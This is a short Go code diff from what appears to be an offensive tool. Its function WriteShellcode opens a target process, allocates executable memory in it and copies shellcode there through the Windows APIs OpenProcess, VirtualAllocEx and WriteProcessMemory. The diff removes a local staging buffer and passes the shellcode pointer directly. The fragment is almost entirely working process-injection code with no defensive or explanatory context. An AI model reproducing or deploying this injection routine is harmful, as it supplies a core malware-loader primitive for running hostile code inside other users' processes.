@@ -137,7 +137,6 @@ const (
 
 var (
 	kernel32            = syscall.MustLoadDLL("kernel32.dll")
-	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
 	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
 	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
 	OpenProcess         = kernel32.MustFindProc("OpenProcess")
@@ -147,15 +146,10 @@ var (
 )
 
 func WriteShellcode(PID int, Shellcode []byte) (uintptr, uintptr, int) {
-	L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	L_AddrPtr := (*[6300000]byte)(unsafe.Pointer(L_Addr))
-	for i := 0; i < len(Shellcode); i++ {
-		L_AddrPtr[i] = Shellcode[i]
-	}
 	var F int = 0
 	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
 	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
+	WriteProcessMemory.Call(Proc, R_Addr, uintptr(unsafe.Pointer(&Shellcode[0])), uintptr(len(Shellcode)), uintptr(F))
 	return Proc, R_Addr, F
 }
 
